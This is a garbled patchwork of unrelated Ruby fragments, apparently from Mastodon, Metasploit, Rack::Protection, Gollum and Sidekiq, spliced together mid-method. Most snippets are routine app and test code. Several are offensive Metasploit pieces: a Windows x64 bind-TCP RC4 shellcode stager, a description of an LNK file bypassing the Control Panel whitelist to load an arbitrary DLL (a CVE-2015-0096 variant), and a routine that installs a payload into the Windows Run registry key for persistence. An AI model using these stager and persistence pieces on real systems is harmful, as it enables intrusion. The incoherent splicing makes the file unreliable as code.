
        
          def relayable?
    @status.public_visibility?
  end
    
      private
    
      describe 'PUT #update' do
    it 'updates notifications settings' do
      user.settings['notification_emails'] = user.settings['notification_emails'].merge('follow' => false)
      user.settings['interactions'] = user.settings['interactions'].merge('must_be_follower' => true)
    
        if verifier.valid?
      @proof.verified = true
      @proof.live     = false
    else
      @proof.errors.add(:base, I18n.t('identity_proofs.errors.keybase.verification_failed', kb_username: @proof.provider_username))
    end
  end
    
      #
  # Generate and compile the stager
  #
  def generate_bind_tcp_rc4(opts={})
    combined_asm = %Q^
      cld                     ; Clear the direction flag.
      and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
      call start              ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp               ; block API pointer
      #{asm_bind_tcp(opts)}
      #{asm_block_recv_rc4(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end
    
      include Msf::Payload::Stager
  include Msf::Payload::Windows::BindTcpRc4_x64
    
    setTimeout(go_, 300);
    
              This vulnerability is a variant of MS15-020 (CVE-2015-0096). The created LNK file is
          similar except an additional SpecialFolderDataBlock is included. The folder ID set
          in this SpecialFolderDataBlock is set to the Control Panel. This is enough to bypass
          the CPL whitelist. This bypass can be used to trick Windows into loading an arbitrary
          DLL file.
    
      # Function to install payload in to the registry HKLM or HKCU
  #-------------------------------------------------------------------------------
  def write_to_reg(key, script_on_target)
    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
    print_status('Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}')
    if key
      registry_setvaldata('#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', nam, script_on_target, 'REG_SZ')
      print_good('Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}')
      @clean_up_rc << 'reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v '#{nam}'\n'
    else
      print_error('Error: failed to open the registry key for writing')
    end
  end
    
          def remove_bad_cookies(request, response)
        return if bad_cookies.empty?
        paths = cookie_paths(request.path)
        bad_cookies.each do |name|
          paths.each { |path| response.set_cookie name, empty_cookie(request.host, path) }
        end
      end
    
          def escape_hash(hash)
        hash = hash.dup
        hash.each { |k,v| hash[k] = escape(v) }
        hash
      end
    
          def react_and_close(env, body)
        reaction = react(env)
    
          expected_header = <<-END.chomp
rack.%2573ession=; domain=example.org; path=/; expires=Thu, 01 Jan 1970 00:00:00 -0000
rack.%2573ession=; domain=example.org; path=/some; expires=Thu, 01 Jan 1970 00:00:00 -0000
rack.%2573ession=; domain=example.org; path=/some/path; expires=Thu, 01 Jan 1970 00:00:00 -0000
rack.session=; domain=example.org; path=/; expires=Thu, 01 Jan 1970 00:00:00 -0000
rack.session=; domain=example.org; path=/some; expires=Thu, 01 Jan 1970 00:00:00 -0000
rack.session=; domain=example.org; path=/some/path; expires=Thu, 01 Jan 1970 00:00:00 -0000
END
      expect(last_response.headers['Set-Cookie']).to eq(expected_header)
    end
  end
    
          def editable
        @editable
      end
    
    # Silence locale validation warning
require 'i18n'
I18n.enforce_available_locales = false
    
      test 'clean path without leading slash' do
    assert_equal '/Mordor', clean_path('Mordor')
  end
    
      test 'remove page extentions' do
    view = Precious::Views::LatestChanges.new
    assert_equal 'page', view.remove_page_extentions('page.wiki')
    assert_equal 'page-wiki', view.remove_page_extentions('page-wiki.md')
    assert_equal 'file.any_extention', view.remove_page_extentions('file.any_extention')
  end
    
        @view = Precious::Views::Page.new
    @view.instance_variable_set :@page, page
    @view.instance_variable_set :@content, page.formatted_data
    @view.instance_variable_set :@h1_title, true
    
        assert_nil dead_set.find_job('000101')
    assert dead_set.find_job('000102')
    assert dead_set.find_job('000103')
  end
end

    
    class Component
  include Sidekiq::ExceptionHandler
    
      it 'uses and stringifies specified options' do
    assert_equal [], Sidekiq::Queue.all.map(&:name)
    q = Sidekiq::Queue.new('notdefault')
    assert_equal 0, q.size
    MyModel.delay(queue: :notdefault).long_class_method
    assert_equal ['notdefault'], Sidekiq::Queue.all.map(&:name)
    assert_equal 1, q.size
  end
    
        it 'saves and restores locale' do
      I18n.locale = 'fr'
      msg = {}
      mw = Sidekiq::Middleware::I18n::Client.new
      mw.call(nil, msg, nil, nil) { }
      assert_equal :fr, msg['locale']
    
          assert Sidekiq::Testing.fake?
      assert Sidekiq::Testing.enabled?
    end
  end